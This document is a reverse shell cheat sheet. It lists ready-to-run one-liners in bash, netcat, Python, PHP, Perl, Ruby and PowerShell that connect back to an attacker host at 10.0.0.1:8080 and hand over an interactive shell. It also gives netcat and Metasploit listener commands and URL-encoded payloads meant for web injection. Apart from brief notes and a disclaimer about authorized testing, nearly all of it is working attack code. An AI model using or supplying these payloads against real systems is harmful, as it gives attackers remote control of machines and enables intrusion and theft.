# Reverse Shell Cheat Sheet

## Bash Reverse Shells

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

## Netcat Reverse Shells

### Traditional Netcat
```bash
nc -e /bin/sh 10.0.0.1 8080
nc -e /bin/bash 10.0.0.1 8080
nc -c bash 10.0.0.1 8080
```

### Netcat without -e flag
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
nc 10.0.0.1 8080 | /bin/bash | nc 10.0.0.1 8081  # Listener both ports 8080 and 8081
```

## Python Reverse Shells

### Python 2
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP Reverse Shells

### Basic PHP Shell
```php
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP One-liner
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"); ?>
```

## Perl Reverse Shell
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby Reverse Shell
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listener Commands

### Netcat Listener
```bash
nc -lvp 8080
nc -lvnp 8080  # More verbose
```

### Metasploit Listener
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # Example payload
set LHOST 10.0.0.1
set LPORT 8080
run
```

## Notes

1. Replace `10.0.0.1` with your attacking machine's IP address
2. Replace `8080` with your desired port number
3. Some shells may need URL encoding if used in web applications
4. Consider using TLS/SSL for encrypted shells in sensitive environments
5. Always ensure you have proper authorization before using these commands

## URL Encoded Versions
Common shells URL encoded for web injection:

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%31%30%2E%30%2E%30%2E%31%2F%38%30%38%30%20%30%3E%26%31

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
%72%6D%20%2F%74%6D%70%2F%66%3B%6D%6B%66%69%66%6F%20%2F%74%6D%70%2F%66%3B%63%61%74%20%2F%74%6D%70%2F%66%7C%2F%62%69%6E%2F%73%68%20%2D%69%20%32%3E%26%31%7C%6E%63%20%31%30%2E%30%2E%30%2E%31%20%38%30%38%30%20%3E%2F%74%6D%70%2F%66
```

## Security Note
⚠️ These commands are for educational purposes and authorized penetration testing only. Unauthorized use may be illegal.
